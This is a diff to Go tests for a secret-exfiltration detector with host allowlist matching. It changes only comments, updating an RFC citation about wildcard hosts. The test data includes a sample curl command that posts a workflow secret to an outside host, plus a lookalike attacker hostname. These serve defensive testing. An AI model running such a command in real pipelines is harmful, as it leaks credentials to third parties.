@@ -1799,10 +1799,11 @@ func TestSecretExfiltration_AllowedHosts_SuffixWildcard(t *testing.T) {
 			wantCount: 0,
 		},
 		{
-			// Matches TLS SAN (RFC 6125) and DNS wildcard (RFC 4592)
-			// semantics: "*.example.com" covers subdomains only, NOT the
-			// apex. Users who want the apex must list "example.com"
-			// explicitly. See userHostAllowlistMatch doc comment.
+			// Matches TLS service-identity (RFC 9525, obsoletes RFC 6125)
+			// and DNS wildcard (RFC 4592) semantics: "*.example.com"
+			// covers subdomains only, NOT the apex. Users who want the
+			// apex must list "example.com" explicitly. See
+			// userHostAllowlistMatch doc comment.
 			name:      "wildcard does NOT match apex",
 			script:    `curl -X POST https://example.com -d "token=${{ secrets.X }}"`,
 			allowed:   []string{"*.example.com"},
@@ -2022,8 +2023,9 @@ func TestUserHostAllowlistMatch(t *testing.T) {
 		{"api.example.com", "api.example.com", true},
 		{"API.Example.com", "api.example.com", true},
 		{"sub.trusted.example.org", "*.trusted.example.org", true},
-		// Apex is NOT covered by "*.trusted.example.org" (RFC 6125 / 4592
-		// semantics). Users must list "trusted.example.org" separately.
+		// Apex is NOT covered by "*.trusted.example.org" (RFC 9525, which
+		// obsoletes RFC 6125, plus RFC 4592 semantics). Users must list
+		// "trusted.example.org" separately.
 		{"trusted.example.org", "", false},
 		{"untrusted.example.org", "", false},
 		{"api.example.com.attacker.com", "", false},
